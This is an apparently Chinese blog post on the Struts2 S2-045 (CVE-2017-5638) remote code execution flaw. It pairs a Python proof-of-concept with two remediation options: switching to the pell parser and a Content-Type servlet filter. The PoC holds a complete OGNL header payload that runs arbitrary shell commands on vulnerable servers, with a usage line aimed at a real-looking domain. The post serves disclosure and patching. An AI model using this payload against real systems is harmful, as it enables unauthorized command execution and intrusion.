<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补 - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Struts2 S2-045 Jakarta插件远程代码执行漏洞利用与修补</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2017-08-29 22:53</div>
  <div>
    <span><a href="https://getshe11.com/tags/struts2/">#Struts2</a></span>
      </div>
  </div>
<div class="content">
  <p>近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。</p>
<p><strong>漏洞编号</strong>： S2-045，CVE-2017-5638</p>
<p><strong>漏洞名称</strong>：基于 Jakarta plugin插件的Struts远程代码执行漏洞</p>
<p><strong>官方评级</strong>：高危</p>
<p><strong>漏洞描述</strong>：Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<p><strong>漏洞利用条件和方式</strong>： 黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</p>
<p>1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能</p>
<p>2.恶意攻击者精心构造Content-Type的值</p>
<p><strong>漏洞影响范围</strong>：</p>
<p>Struts 2.3.5 – Struts 2.3.31</p>
<p>Struts 2.5 – Struts 2.5.10</p>
<hr>
<h1 id="测试利用代码">测试利用代码</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># encoding:utf-8</span>
<span style="color:#f92672">import</span> urllib2
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">from</span> poster.encode <span style="color:#f92672">import</span> multipart_encode
<span style="color:#f92672">from</span> poster.streaminghttp <span style="color:#f92672">import</span> register_openers
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">poc</span>():
register_openers()
datagen, header <span style="color:#f92672">=</span> multipart_encode({<span style="color:#e6db74">&#34;image1&#34;</span>: open(<span style="color:#e6db74">&#34;tmp.txt&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)})
header[<span style="color:#e6db74">&#34;User-Agent&#34;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#34;</span>
header[<span style="color:#e6db74">&#34;Content-Type&#34;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&#34;</span><span style="color:#f92672">+</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&#34;</span>
<span style="color:#66d9ef">try</span>:
request <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>Request(str(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]),datagen,headers<span style="color:#f92672">=</span>header)
response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(request)
<span style="color:#66d9ef">print</span> response<span style="color:#f92672">.</span>read()
<span style="color:#66d9ef">except</span> mysqldb<span style="color:#f92672">.</span>Error,e:
<span style="color:#66d9ef">print</span> e
poc()
</code></pre></div><p><strong>POC使用方法： st2-045.py <a href="http://www.getpass.cn">http://www.getpass.cn</a> ifconfig</strong></p>
<hr>
<h1 id="修复方案1">修复方案1</h1>
<p>将<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/lib/<!-- raw HTML omitted -->下的 <!-- raw HTML omitted -->struts2-core-2.3.31.jar<!-- raw HTML omitted -->压解出来，然后编辑<!-- raw HTML omitted -->org\apache\struts2<!-- raw HTML omitted -->下的<!-- raw HTML omitted -->default.properties<!-- raw HTML omitted -->文件</p>
<p>找到<!-- raw HTML omitted -->struts.multipart.parser<!-- raw HTML omitted -->，该选项就是Struts2的Multipart parser应用配置，默认值为jakarta，即此次出现命令执行漏洞的上传框架。</p>
<p>将其修改为pell，相当于将存在漏洞的jakarta框架禁用了。</p>
<p>修改后值<!-- raw HTML omitted -->struts.multipart.parser=pell<!-- raw HTML omitted --></p>
<p>重启tomcat服务，切换到<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/bin/<!-- raw HTML omitted -->目录下，首先执行<!-- raw HTML omitted -->./shutdown.sh<!-- raw HTML omitted -->，然后执行<!-- raw HTML omitted -->./startup.sh<!-- raw HTML omitted --></p>
<p>再次执行POC</p>
<hr>
<h1 id="修复方案2">修复方案2</h1>
<p>添加拦截器：此次 S2-045 漏洞触发点为Content-TypeHTTP头字段，故此可以添加action拦截器，过滤非法请求。</p>
<p><strong>拦截类SecurityFilter.java代码：</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.Filter<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.FilterChain<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.FilterConfig<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.ServletException<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.ServletRequest<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.ServletResponse<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.http.HttpServlet<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse<span style="color:#f92672">;</span>


<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SecurityFilter</span> <span style="color:#66d9ef">extends</span> HttpServlet <span style="color:#66d9ef">implements</span> Filter <span style="color:#f92672">{</span>

        <span style="color:#75715e">/**
</span><span style="color:#75715e">         * 
</span><span style="color:#75715e">         */</span>
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L<span style="color:#f92672">;</span>


        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> String www_url_encode<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#f92672">;</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> String mul_data<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;multipart/form-data &#34;</span><span style="color:#f92672">;</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> String txt_pla<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span><span style="color:#f92672">;</span>

        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doFilter</span><span style="color:#f92672">(</span>ServletRequest arg0<span style="color:#f92672">,</span> ServletResponse arg1<span style="color:#f92672">,</span>
                        FilterChain arg2<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ServletException <span style="color:#f92672">{</span>

                HttpServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpServletRequest<span style="color:#f92672">)</span> arg0<span style="color:#f92672">;</span>
                HttpServletResponse response <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpServletResponse<span style="color:#f92672">)</span> arg1<span style="color:#f92672">;</span>

                String contenType<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;conTent-type&#34;</span><span style="color:#f92672">);</span>

                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>contenType<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;!</span>contenType<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)&amp;&amp;!</span>contenType<span style="color:#f92672">.</span><span style="color:#a6e22e">equalsIgnoreCase</span><span style="color:#f92672">(</span>www_url_encode<span style="color:#f92672">)&amp;&amp;!</span>contenType<span style="color:#f92672">.</span><span style="color:#a6e22e">equalsIgnoreCase</span><span style="color:#f92672">(</span>mul_data<span style="color:#f92672">)&amp;&amp;!</span>contenType<span style="color:#f92672">.</span><span style="color:#a6e22e">equalsIgnoreCase</span><span style="color:#f92672">(</span>txt_pla<span style="color:#f92672">)){</span>

                        response<span style="color:#f92672">.</span><span style="color:#a6e22e">setContentType</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;text/html;charset=UTF-8&#34;</span><span style="color:#f92672">);</span>
                        response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;非法请求Content-Type！&#34;</span><span style="color:#f92672">);</span>
                        <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
                <span style="color:#f92672">}</span>
                arg2<span style="color:#f92672">.</span><span style="color:#a6e22e">doFilter</span><span style="color:#f92672">(</span>request<span style="color:#f92672">,</span> response<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span><span style="color:#f92672">(</span>FilterConfig arg0<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> ServletException <span style="color:#f92672">{</span>

        <span style="color:#f92672">}</span>

<span style="color:#f92672">}</span>
</code></pre></div><p>将<!-- raw HTML omitted -->SecurityFilter.java<!-- raw HTML omitted -->文件编译为<!-- raw HTML omitted -->SecurityFilter.class<!-- raw HTML omitted -->，放入服务器路径为：<!-- raw HTML omitted -->/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/classes/<!-- raw HTML omitted --></p>
<p>然后修改<!-- raw HTML omitted -->web.xml(/var/www/apache-tomcat-7.0.14/webapps/ROOT/WEB-INF/web.xml)<!-- raw HTML omitted -->使得添加的拦截器生效
<strong>添加代码：</strong></p>
<pre><code>&lt;filter&gt;
    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
&lt;filter-mapping&gt;
    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre><p><strong>重启tomcat</strong></p>
<p>漏洞相关链接：</p>
<p><a href="http://www.freebuf.com/sectool/129224.html">http://www.freebuf.com/sectool/129224.html</a></p>
<p><a href="http://www.codesec.net/view/541868.html">http://www.codesec.net/view/541868.html</a></p>
<p><a href="https://www.t00ls.net/thread-38534-1-1.html">https://www.t00ls.net/thread-38534-1-1.html</a></p>
<p><a href="https://github.com/Flyteas/Struts2-045-Exp">https://github.com/Flyteas/Struts2-045-Exp</a>  Struts2 S2-045 (CVE-2017-5638) Exp Tools</p></div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%b5%8b%e8%af%95%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81">
                            测试利用代码
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e4%bf%ae%e5%a4%8d%e6%96%b9%e6%a1%881">
                            修复方案1
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e4%bf%ae%e5%a4%8d%e6%96%b9%e6%a1%882">
                            修复方案2
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
